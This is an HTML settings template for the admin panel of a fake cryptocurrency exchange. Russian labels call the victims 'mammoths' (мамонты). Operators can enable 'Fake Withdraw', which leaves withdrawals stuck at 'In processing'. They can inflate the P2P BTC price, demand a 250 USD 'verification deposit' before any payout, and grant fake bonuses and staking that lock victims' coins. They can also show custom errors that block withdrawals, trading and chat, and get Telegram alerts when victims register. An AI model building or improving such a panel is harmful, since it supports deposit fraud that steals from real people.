<div class="d-flex flex-column flex-column-fluid">
		<!--begin::Toolbar-->
		<div id="kt_app_toolbar" class="app-toolbar py-3 py-lg-6">
			<!--begin::Toolbar container-->
			<div id="kt_app_toolbar_container" class="app-container container-xxl d-flex flex-stack">
				<!--begin::Page title-->
				<div class="page-title d-flex flex-column justify-content-center flex-wrap me-3">
					<!--begin::Title-->
					<h1 class="page-heading d-flex text-dark fw-bold fs-3 flex-column justify-content-center my-0">Settings</h1>
					<!--end::Title-->
					<!--begin::Breadcrumb-->
					<ul class="breadcrumb breadcrumb-separatorless fw-semibold fs-7 my-0 pt-1">
						<!--begin::Item-->
						<li class="breadcrumb-item text-muted">
							<a href="index" class="text-muted text-hover-primary">Home</a>
						</li>
						<!--end::Item-->
						<!--begin::Item-->
						<li class="breadcrumb-item">
							<span class="bullet bg-gray-400 w-5px h-2px"></span>
						</li>
						<!--end::Item-->
						<!--begin::Item-->
						<li class="breadcrumb-item text-muted">Account</li>
						<!--end::Item-->
					</ul>
					<!--end::Breadcrumb-->
				</div>
				<!--end::Page title-->
			</div>
			<!--end::Toolbar container-->
		</div>
		<!--end::Toolbar-->
		<!--begin::Content-->
		<div id="kt_app_content" class="app-content flex-column-fluid">
			<!--begin::Content container-->
			<div id="kt_app_content_container" class="app-container container-xxl">
				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Main settings</h3>
						</div>
						<!--end::Card title-->
					</div>
					<!--begin::Card header-->
					<!--begin::Content-->
					<div id="id_11" class="collapse show">
						<!--begin::Form-->
						<form id="id_22" class="form">
							<!--begin::Card body-->
							<div class="card-body border-top p-9">
								<!--begin::Main group-->

								<!--begin::Input group-->
								<div class="row mb-20">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Telegram Notifications [РАБОТАЕТ]
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-primary translate rounded"></span>
											<!--end::Line-->
										</span>

										<div class="text-gray-600 mt-5">
											Открываем бота <a href="https://t.me/userinfobot"><strong>@userinfobot</strong></a> (кликабельно), вводим <strong>/start</strong><br>
											Бот напишет ваш <strong>ID</strong> Можно писать несколько ID через запятую: <b>1</b>,<b>2</b>,<b>3</b><br>
											Копируем и вставляем цифры в поле ниже и нажимаем кнопку Save changes.<br>
											Открываем бота <a href="https://t.me/exchangenotybot"><strong>@exchangenotybot</strong></a> (кликабельно), вводим <strong>/start</strong>
										</div>
									</div>
									<!--begin::Label-->

									<!--end::Label-->
									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">
											<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-telegram me-2" viewBox="0 0 16 16">
												<path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"></path>
											</svg>
											Telegram ID:
										</span>
										<input type="text" class="form-control" value="{telegram_notifications_id}" id="settings_telegram_id" aria-describedby="basic-addon3">
									</div>
									<!--end::Col-->
									<div class="text-gray-600">
										Вы будете получать уведомления в ТГ каждый раз когда ваш юзер:<br>
										<span class="bullet me-5"></span>Зарегистрировался на бирже<br>
										<!-- <span class="bullet me-5"></span>написал в саппорт<br> -->
										<!-- <span class="bullet me-5"></span>написал в трейдинг-чат<br> -->
										<!-- <span class="bullet me-5"></span>сделал депозит<br> -->
										<!-- <span class="bullet me-5"></span>запросил вывод (при включенном Fake Withdraw)<br> -->
										<!-- <span class="bullet me-5"></span>включил 2FA<br> -->
										<!-- <span class="bullet me-5"></span>отправил документы для KYC<br> -->
									</div>
									<div class="d-flex mt-5 justify-content-end"><span id="saveSettingsDate" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-20">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Your payment addresses [РАБОТАЕТ]
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-warning translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">
											Здесь вы должны указать свои крипто адреса для выплат. <br>
											Все выплаты будут осуществляться <strong>только</strong> на те адреса, которые указаны здесь.
										</div>
									</div>

									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">Bitcoin:</span>
										<input value="{payment_addresses_BTC}" id="sp_ad_btc" type="text" class="form-control" aria-describedby="basic-addon3" placeholder="bc1....">
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">Ethereum:</span>
										<input value="{payment_addresses_ETH}" id="sp_ad_eth" type="text" class="form-control" aria-describedby="basic-addon3" placeholder="0xc19...">
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">Litecoin:</span>
										<input type="text" class="form-control" value="{payment_addresses_LTC}" id="sp_ad_ltc" aria-describedby="basic-addon3" placeholder="ltc2...">
									</div>
									<!--end::Col-->

									<div class="text-gray-600">В целях безопасности, после указания адресов, изменить их можно будет только через личное обращение к админу.</div>

																	</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-20">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												P2P Price
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-success translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Функция завышения цены за BTC на P2P странице для ваших юзеров</div>
									</div>

									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">
											<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-currency-exchange me-2" viewBox="0 0 16 16">
												<path d="M0 5a5.002 5.002 0 0 0 4.027 4.905 6.46 6.46 0 0 1 .544-2.073C3.695 7.536 3.132 6.864 3 5.91h-.5v-.426h.466V5.05c0-.046 0-.093.004-.135H2.5v-.427h.511C3.236 3.24 4.213 2.5 5.681 2.5c.316 0 .59.031.819.085v.733a3.46 3.46 0 0 0-.815-.082c-.919 0-1.538.466-1.734 1.252h1.917v.427h-1.98c-.003.046-.003.097-.003.147v.422h1.983v.427H3.93c.118.602.468 1.03 1.005 1.229a6.5 6.5 0 0 1 4.97-3.113A5.002 5.002 0 0 0 0 5zm16 5.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0zm-7.75 1.322c.069.835.746 1.485 1.964 1.562V14h.54v-.62c1.259-.086 1.996-.74 1.996-1.69 0-.865-.563-1.31-1.57-1.54l-.426-.1V8.374c.54.06.884.347.966.745h.948c-.07-.804-.779-1.433-1.914-1.502V7h-.54v.629c-1.076.103-1.808.732-1.808 1.622 0 .787.544 1.288 1.45 1.493l.358.085v1.78c-.554-.08-.92-.376-1.003-.787H8.25zm1.96-1.895c-.532-.12-.82-.364-.82-.732 0-.41.311-.719.824-.809v1.54h-.005zm.622 1.044c.645.145.943.38.943.796 0 .474-.37.8-1.02.86v-1.674l.077.018z"></path>
											</svg>
											Amount:
										</span>
										<input type="number" value="1200" class="form-control" id="sp_up_p2p_amount" aria-describedby="basic-addon3" placeholder="0"><span class="input-group-text">USD</span>
									</div>
									<!--end::Col-->
									<div class="text-gray-600">
										Укажите <strong>0</strong> для выключения накрутки курса.<br>
										Укажите в поле сумму (в USD), на которую курс BTC будет выше, чем на бинансе.<br>
										<br>
										<i>
											Пример: Сейчас курс BTC на Бинансе = 20000$, если мы пропишем в настройках 1000, то на странице P2P курс BTC будет равен 21000$ у первого объявления, а у  остальных объявлений курс будет выше на небольшие рандомные суммы.
											<br></i>
											При попытке воспользоваться поиском или открыть объявление мамонту будет отображена ошибка, текст которой вы можете указать в настройках ниже (P2P Error).
										
									</div>

									<div class="d-flex mt-5 justify-content-end"><span id="save_sp_up_p2p_amount" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-20">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Registration bonus amount
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-danger translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Каждому юзеру, который будет зарегистрирован на вашем домене - на баланс будет начислена данная сумма (в BTC)</div>
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">Bonus amount:</span>
										<input id="sp_bonus_amount" type="number" class="form-control" placeholder="0" value="0">
										<span class="input-group-text">BTC</span>
									</div>

									<div class="text-gray-600">
										0 = выключен. Размер бонуса указывается в BTC.<br>
										<i>Пример: 0.12345</i>
									</div>

									<label class="col-lg-4 col-form-label fw-semibold">
										<div class="fs-4 fw-bold">Alert text:</div>
									</label>
									<div>
										<textarea data-provider="summernote" name="post_body" id="sp_bonus_text_register"></textarea>
										<script>
			                              $('#sp_bonus_text_register').summernote({
			                                placeholder: 'Congrulations! You received a bonus of 0.005 BTC',
			                                tabsize: 5,
			                                height: 150,
			                                toolbar: [
			                                  ['style', ['style']],
			                                  ['font', ['bold', 'underline', 'clear']],
			                                  ['color', ['color']],
			                                  ['view', ['codeview']]
			                                ]
			                              });
			                          </script>
									</div>
									<div class="text-gray-600 mt-5">
										Текст уведомления (о зачислении бонуса на счет), который отобразится юзеру после успешной регистрации.
									</div>
									<!--end::Col-->
									<div class="d-flex mt-5 justify-content-end"><span id="save_sp_bonus_amount" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-10">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Staking (Investment) percents [РАБОТАЕТ] 
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-info translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Вы можете изменить проценты по планам для ваших юзеров. Влияет только на НОВЫЕ планы</div>
									</div>

									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">1 week:</span>
										<input id="sp_up_invest_1w" type="number" class="form-control" placeholder="1.1" value="{staking_percent_7}"><span class="input-group-text">%</span>
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">2 week:</span>
										<input id="sp_up_invest_2w" type="number" class="form-control" placeholder="1.2" value="{staking_percent_14}"><span class="input-group-text">%</span>
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">1 month:</span>
										<input id="sp_up_invest_1m" type="number" class="form-control" placeholder="15" value="{staking_percent_30}"><span class="input-group-text">%</span>
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">3 month:</span>
										<input id="sp_up_invest_2m" type="number" class="form-control" placeholder="1ю8" value="{staking_percent_90}"><span class="input-group-text">%</span>
									</div>
									<!--end::Col-->

									<div class="text-gray-600">Проценты указываются за 1 день (система автоматически умножает ваш процент на срок плана).</div>

									<div class="d-flex mt-5 justify-content-end"><span id="save_sp_invest_percent" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-10">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Minimal deposit amount [РАБОТАЕТ]
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-success translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Вы можете изменить сумму в любое время</div>
									</div>

									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">Minimum amount:</span>
										<input id="sp_minimum_deposit" type="number" class="form-control" placeholder="20" value="{minimal_deposit_amount}"><span class="input-group-text">USD</span>
									</div>
									<!--end::Col-->

									<div class="text-gray-600">Напишите сумму в долларах которая автоматически будет конвертирован для всех валют по отдельности на странице "Deposit".</div>

									<div class="d-flex mt-5 justify-content-end"><span id="save_sp_min_deposit" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->
							</div>

							<!--end::Card body-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

				<!--begin::Verification group-->

				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Verification settings</h3>
						</div>
						<!--end::Card title-->
					</div>
					<!--begin::Card header-->
					<!--begin::Content-->
					<div id="id_12" class="collapse show">
						<!--begin::Form-->
						<form id="id_23" class="form">
							<!--begin::Card body-->
							<div class="card-body border-top p-9">
								<span class="d-inline-block position-relative mb-5">
									<!--begin::Label-->
									<span class="fs-3 fw-bold m-0 mb-1">
										Verification requirement
									</span>
									<!--end::Label-->

									<!--begin::Line-->
									<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-warning translate rounded"></span>
									<!--end::Line-->
								</span>

								<div class="d-flex flex-stack mb-5">
									<div class="d-flex">
										<div class="d-flex flex-column">
											<div class="text-gray-600">
												Если включено - то при попытке вывода для новых юзеров будет появляться окно обязательной верификации (обязательно внести депозит). <br>
												Действует только для новых юзеров.
											</div>
										</div>
									</div>
																		<div class="d-flex justify-content-end">
										<div class="form-check form-check-solid form-check-custom form-switch">
											<input id="sp_verify_select" class="form-check-input w-45px h-30px" style="cursor:pointer" type="checkbox">
											<label class="form-check-label" for="googleswitch"></label>
										</div>
									</div>
								</div>
								<div class="d-flex justify-content-end"><span id="save_sp_verify_select" class="btn btn-primary">Save changes</span></div>

								<div class="separator separator-dashed mt-20 mb-20"></div>

								<!--begin::Input group-->
								<div class="row mb-20">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Verification Deposit Amount
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-success translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Сумма депозита, которую должен внести юзер, для прохождения идентификации на странице Withdraw.</div>
									</div>

									<!--begin::Col-->
									<div class="input-group mb-5 mt-5">
										<span class="input-group-text" id="basic-addon3">Amount deposit:</span>
										<input id="sp_verify_usd" value="250" type="number" class="form-control" placeholder="0"><span class="input-group-text">USD</span>
									</div>
									<!--end::Col-->
									<div class="text-gray-600">Сумму вводить в USD. Курс будет автоматически пересчитан для каждой монеты.</div>

									<div class="d-flex mt-5 justify-content-end"><span id="save_sp_verify" class="btn btn-primary">Save changes</span></div>
								</div>
								<!--end::Input group-->

								<div class="separator separator-dashed my-5 mb-20"></div>

								
								<!--begin::Input group-->
								<div class="row mb-10">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Verification Deposit Coins
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-primary translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Вы можете выбрать определенные монеты, которые будут доступны для верификационного депозита юзером на странице Withdraw</div>
									</div>
									<div class="input-group flex-nowrap mt-5 mb-5">
										<span class="input-group-text">Select coin:</span>
										<div class="overflow-hidden flex-grow-1">
											<select id="withdraw_verify_currency_sp" name="currnecy" aria-label="Select a Timezone" data-control="select2" data-placeholder="Select currency" class="form-select rounded-start-0">
											<option value="btc">Bitcoin</option><option value="eth">Ethereum</option><option value="ltc">Litecoin</option><option value="usdttrc">USDT TRC-20</option><option value="usdt">USDT ERC-20</option><option value="usdtbep">USDT BEP-20</option><option value="trx">Tron</option><option value="bnb20">BNB BEP-20</option><option value="bch">Bitcoin Cash</option><option value="doge">Dogecoin</option><option value="xmr">Monero</option><option value="xlm">Stellar</option><option value="xtz">Tezos</option><option value="eos">EOS</option><option value="shib">SHIBA INU BEP-20</option><option value="link">Chainlink ERC-20</option><option value="btg">Bitcoin Gold</option><option value="etc">Ethereum Classic</option><option value="xrp">Ripple</option><option value="ada">Cardano</option><option value="dash">Dash</option><option value="zec">Zcash</option><option value="sol">SOL</option><option value="busd">BUSD</option>											</select>
										</div>
									</div>

									<div class="text-gray-600">Если добавить монеты - то для юзера будут доступны только эти монеты для депозита, если не добавлять, то для депозита будут разрешены все возможные монеты.</div>

									<div class="d-flex mt-5 justify-content-end"><span id="add_withdraw_verify_currency_sp" class="btn btn-primary">Add coin</span></div>
								</div>

								<div>
									<div class="table-responsive">
										<table class="table table-rounded table-row-bordered border gy-7 gs-7">
											<thead>
												<tr class="fw-semibold fs-6 text-gray-800 border-bottom border-gray-200">
													<th>ID</th>
													<th>Coin</th>
													<th>Action</th>
												</tr>
											</thead>
											<tbody>
												<tr><td></td><td>No data available in table</td></tr>											</tbody>
										</table>
									</div>
								</div>
								<!--end::Input group-->
								
								
								
								<!--end::Input group-->
							</div>
							<!--end::Card body-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

				<!--begin::Utility settings group-->

				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20" data-select2-id="select2-data-126-pf72">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Utility settings</h3>
						</div>
						<!--end::Card title-->
					</div>
					<!--begin::Card header-->
					<!--begin::Content-->
					<div class="collapse show" data-select2-id="select2-data-125-80q4">
						<!--begin::Form-->
						<form class="form" data-select2-id="select2-data-124-lpuh">
							<!--begin::Card body-->
							<div class="card-body border-top p-9">
								<!--begin::Input group-->
								<div class="row mb-10">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Send bonus to all users
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-danger translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Вы можете отправить бонус в виде выбранной ниже монеты всем вашим юзерам</div>
									</div>

									<div class="input-group flex-nowrap mt-5" data-select2-id="select2-data-123-me2a">
										<span class="input-group-text">Select coin:</span>
										<div class="overflow-hidden flex-grow-1" data-select2-id="select2-data-122-gr94">
											<select id="sp_send_balance_all" name="currnecy" aria-label="Select a Timezone" data-control="select2" data-placeholder="Select currency" class="form-select rounded-start-0">
												<option value="btc">Bitcoin</option>
						                        <option value="eth">Ethereum</option>
						                        <option value="ltc">Litecoin</option>
											</select>
										</div>
									</div>

									<div class="input-group mb-5 mt-5">
										<span class="input-group-text">Amount:</span>
										<input id="sp_bonus_amount_all" type="number" class="form-control" placeholder="0" />
									</div>

									<div class="text-gray-600">Баланс пополнится у всех ваших юзеров и в транзакциях будет помечен как "Bonus".<br /></div>

									<label class="col-lg-4 col-form-label fw-semibold">
										<div class="fs-4 fw-bold">Alert text:</div>
									</label>
									<div>
										<input id="sp_bonus_text_all" type="text" value="" class="form-control form-control-solid" placeholder="Congrulations! You received a bonus of 0.005 BTC">
									</div>

									<div class="text-gray-600 mt-5">Текст уведомления (об успешном зачислении бонуса на счет), который отобразится юзеру после получения бонуса</div>
									<!--end::Col-->
								</div>
								<!--end::Input group-->
							</div>
							<!--end::Card body-->
							<!--begin::Actions-->
							<div class="card-footer d-flex justify-content-end py-6 px-9">
								<span id="save_sp_send_all_balance" type="submit" class="btn btn-primary">Send bonus</span>
							</div>
							<!--end::Actions-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

				<!--begin::Features settings group-->

				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Features settings</h3>
						</div>
						<!--end::Card title-->
					</div>
					<!--begin::Card header-->
					<!--begin::Content-->
					<div class="collapse show">
						<!--begin::Form-->
						<form class="form">
							<!--begin::Card body-->
							<div class="card-body border-top p-9">
																<div class="row">
									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="fake_w_all_checked" class="form-check-input me-3" type="checkbox" {enable_fake_withdraw_for_ALL_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Fake Withdraw for ALL users [РАБОТАЕТ]</span>
											<span class="text-gray-600">
												Если включено, то у <strong>всех</strong> ваших юзеров функция "Fake Withdraw" будет активна. Эта функция перебивает окно верификации, и вывод будет доступен даже если включены обе функции.
											</span>
										</span>
										<!--end::Label-->
									</label>

									<div class="separator separator-dashed my-6"></div>

									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="fake_w_new_checked" class="form-check-input me-3" type="checkbox" {enable_fake_withdraw_for_NEW_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Fake Withdraw for NEW users</span>
											<span class="text-gray-600">
												Если включено, то вывод средств у ваших <strong>новых</strong> юзеров будет успешным. В истории у транзакции будет статус "In processing", который вы можете менять на странице профиля юзера.
												Действует только для новых юзеров.
											</span>
										</span>
										<!--end::Label-->
									</label>

									<div class="separator separator-dashed my-6"></div>

									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="invest_all_checked" class="form-check-input me-3" type="checkbox" {enable_invest_for_ALL_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Invest (staking) for ALL users [РАБОТАЕТ]</span>
											<span class="text-gray-600">
												Если включено, то у <strong>всех</strong> ваших юзеров будет возможность "застейкать" свои монеты на странице Invest.<br>
												<i> Важно: после того, как юзер закинет свои монеты в стейкинг - они пропадут у него с баланса на время действия инвест-плана.</i>
											</span>
										</span>
										<!--end::Label-->
									</label>

									<div class="separator separator-dashed my-6"></div>

									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="invest_new_checked" class="form-check-input me-3" type="checkbox" {enable_invest_for_NEW_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Invest (staking) for NEW users</span>
											<span class="text-gray-600">
												Если включено, то у ваших <strong>новых</strong> юзеров будет возможность "застейкать" свои монеты на странице Invest. <br>
												<i>Важно: после того, как юзер закинет свои монеты в стейкинг - они пропадут у него с баланса на время действия инвест-плана.</i>
											</span>
										</span>
										<!--end::Label-->
									</label>

									<div class="separator separator-dashed my-6"></div>

									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="transfer_all_checked" class="form-check-input me-3" type="checkbox" {enable_transfer_for_ALL_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Transfer for ALL users [РАБОТАЕТ]</span>
											<span class="text-gray-600">Если включено, то <strong>все</strong> ваши юзеры смогут использовать функцию трансфера между аккаунтами внутри биржи.</span>
										</span>
										<!--end::Label-->
									</label>

									<div class="separator separator-dashed my-6"></div>

									<label class="form-check form-check-custom form-check-solid align-items-start">
										<!--begin::Input-->
										<input id="transfer_new_checked" class="form-check-input me-3" type="checkbox" {enable_transfer_for_NEW_users}>
										<!--end::Input-->
										<!--begin::Label-->
										<span class="form-check-label d-flex flex-column align-items-start">
											<span class="fw-bold fs-5 mb-0">Enable Transfer for NEW users</span>
											<span class="text-gray-600">Если включено, то только ваши <strong>новые</strong> юзеры смогут использовать функцию трансфера между аккаунтами внутри биржи.</span>
										</span>
										<!--end::Label-->
									</label>
								</div>
							</div>
							<!--end::Card body-->
							<!--begin::Actions-->
							<div class="card-footer d-flex justify-content-end py-6 px-9">
								<span id="save_sp_features_settings" class="btn btn-primary">Save changes</span>
							</div>
							<!--end::Actions-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

				<!--begin::Errors group-->

				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Errors settings [РАБОТАЕТ]</h3>
							
						</div>
						
						<!--end::Card title-->
					</div>
					
					<!--begin::Card header-->
					<!--begin::Content-->
					<div id="id_13" class="collapse show">
					
						<!--begin::Form-->
						<form id="id_24" class="form">
						
							<!--begin::Card body-->
							<div class="border-top card-body pt-md-0">
							
							<div class="text-gray-600 mb-5">Эти текста ошибок будут применяться к новым мамонтам. Что бы изменить ошибку у старых мамонтов, нужно редактировать их профиль</div>
							
								<div class="d-flex flex-wrap gap-5">
									<!--begin::editor body-->
									<div class="flex-row-fluid w-400px">
										<div class="row mt-10">
											<div>
												<span class="d-inline-block position-relative mb-3">
													<!--begin::Label-->
													<span class="fs-3 fw-bold m-0 mb-1">
														Withdraw error
													</span>
													<!--end::Label-->

													<!--begin::Line-->
													<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-danger translate rounded"></span>
													<!--end::Line-->
												</span>
												<div class="text-gray-600 mb-5">Ошибка, которая отобразится при попытке юзером вывести средства с биржи</div>
											</div>
										</div>

										<div>
											<br>
											<textarea data-provider="summernote" name="post_body" id="SettingsDefaultErrorMessage">{withdraw_error}</textarea>
				                            
											<script>
				                              $('#SettingsDefaultErrorMessage').summernote({
				                                placeholder: 'Withdraw Error..',
				                                tabsize: 5,
				                                height: 180,
				                                toolbar: [
				                                  ['style', ['style']],
				                                  ['font', ['bold', 'underline', 'clear']],
				                                  ['color', ['color']],
				                                  ['para', ['ul', 'ol', 'paragraph']],
				                                  ['table', ['table']],
				                                  ['insert', ['link', 'picture', 'video']],
				                                  ['view', ['fullscreen', 'codeview', 'help']]
				                                ]
				                              });
				                          </script>
										</div>
									</div>
									<!--end::editor body-->

									<!--begin::editor body-->
									<div class="flex-row-fluid w-400px">
										<div class="row mt-10">
											<div>
												<span class="d-inline-block position-relative mb-3">
													<!--begin::Label-->
													<span class="fs-3 fw-bold m-0 mb-1">
														Trading error
													</span>
													<!--end::Label-->

													<!--begin::Line-->
													<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-success translate rounded"></span>
													<!--end::Line-->
												</span>
												<div class="text-gray-600 mb-5">Ошибка, которая отобразится при попытке юзером начать торговлю (открыть Buy/Sell Order) на странице Trading</div>
											</div>
										</div>

										<div>
											<textarea data-provider="summernote" name="post_body" id="SettingsDefaultErrorMessage2">{trading_error}<br></textarea>
				                           <script>
				                              $('#SettingsDefaultErrorMessage2').summernote({
				                                placeholder: 'Default Error..',
				                                tabsize: 5,
				                                height: 180,
				                                toolbar: [
				                                  ['style', ['style']],
				                                  ['font', ['bold', 'underline', 'clear']],
				                                  ['color', ['color']],
				                                  ['para', ['ul', 'ol', 'paragraph']],
				                                  ['table', ['table']],
				                                  ['insert', ['link', 'picture', 'video']],
				                                  ['view', ['fullscreen', 'codeview', 'help']]
				                                ]
				                              });
				                          </script>
										</div>
									</div>
									<!--end::editor body-->

									<!--begin::editor body-->
									<div class="flex-row-fluid w-400px">
										<div class="row mt-10">
											<div>
												<span class="d-inline-block position-relative mb-3">
													<!--begin::Label-->
													<span class="fs-3 fw-bold m-0 mb-1">
														Chat (trading page) error
													</span>
													<!--end::Label-->

													<!--begin::Line-->
													<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-warning translate rounded"></span>
													<!--end::Line-->
												</span>
												<div class="text-gray-600 mb-5">Ошибка, которая отобразится при попытке юзером отправить сообщение в чат на странице Trading</div>
											</div>
										</div>

										<div>
											<textarea data-provider="summernote" name="post_body" id="SettingsDefaultErrorMessage3">{chat_error}</textarea>
				                            
											<script>
				                              $('#SettingsDefaultErrorMessage3').summernote({
				                                placeholder: 'Chat Error..',
				                                tabsize: 5,
